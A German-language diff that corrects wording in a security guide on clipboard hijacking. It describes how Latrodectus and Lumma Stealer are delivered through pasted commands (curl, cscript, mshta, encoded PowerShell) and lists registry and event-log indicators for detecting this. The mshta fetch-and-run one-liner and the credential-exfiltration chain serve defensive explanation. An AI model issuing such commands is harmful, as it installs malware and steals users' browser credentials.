@@ -49,20 +49,20 @@ powershell -nop -enc <Base64>  # Cloud Identificator: 2031
 ```
 1. Lädt `la.txt` mit **curl.exe** herunter  
 2. Führt den JScript-Downloader in **cscript.exe** aus  
-3. Holt eine MSI-Nutzlast → legt `libcef.dll` neben einer signierten Anwendung ab → DLL-Sideloading → Shellcode → Latrodectus.  
+3. Holt ein MSI-Payload → legt `libcef.dll` neben einer signierten Anwendung ab → DLL-Sideloading → Shellcode → Latrodectus.  
 
 ### Lumma Stealer über MSHTA
 ```
 mshta https://iplogger.co/xxxx =+\\xxx
 ```
-Der **mshta**-Aufruf startet ein verborgenes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` durch `extrac32` und Dateikonkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Anmeldeinformationen an `sumeriavgv.digital` exfiltriert.
+Der **mshta**-Aufruf startet ein verstecktes PowerShell-Skript, das `PartyContinued.exe` abruft, `Boat.pst` (CAB) extrahiert, `AutoIt3.exe` durch `extrac32` und Dateikonkatenation rekonstruiert und schließlich ein `.a3x`-Skript ausführt, das Browser-Anmeldeinformationen an `sumeriavgv.digital` exfiltriert.
 
 ## Erkennung & Jagd
 
 Blue-Teams können Clipboard-, Prozess-Erstellungs- und Registrierungs-Telemetrie kombinieren, um Pastejacking-Missbrauch zu identifizieren:
 
 * Windows-Registrierung: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` führt eine Historie von **Win + R**-Befehlen – suchen Sie nach ungewöhnlichen Base64 / obfuskierten Einträgen.
-* Sicherheitsereignis-ID **4688** (Prozess-Erstellung), bei dem `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
+* Sicherheitsereignis-ID **4688** (Prozess-Erstellung), bei der `ParentImage` == `explorer.exe` und `NewProcessName` in { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
 * Ereignis-ID **4663** für Datei-Erstellungen unter `%LocalAppData%\Microsoft\Windows\WinX\` oder temporären Ordnern kurz vor dem verdächtigen 4688-Ereignis.
 * EDR-Clipboard-Sensoren (falls vorhanden) – korrelieren Sie `Clipboard Write`, gefolgt von einem neuen PowerShell-Prozess.
 
